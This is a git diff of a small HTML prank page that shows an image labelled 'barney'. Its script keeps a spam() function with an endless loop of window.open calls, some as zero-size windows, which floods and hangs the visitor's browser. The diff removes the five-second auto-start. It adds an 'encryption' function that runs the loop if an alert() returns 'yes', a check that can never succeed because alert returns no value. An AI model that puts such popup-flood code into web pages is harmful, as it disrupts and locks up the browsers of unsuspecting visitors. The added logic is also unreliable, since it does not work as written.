@@ -7,13 +7,19 @@
 <body>
   <img src="IMG_1099.JPG" alt="barney">
   <script>
+    var foo;
     function spam() {
       while(true) {
         window.open("https://maxwellmlin.github.io/spam")
         window.open("https://maxwellmlin.github.io/spam", "", w = 0, h = 0);
       }
     }
-    setTimeout(function(){ spam(); }, 5000);
+    function encryption() {
+      foo = alert("are you barney")
+      if (foo == "yes") {
+        spam();
+      }
+    }
   </script>
 </body>
 </html>
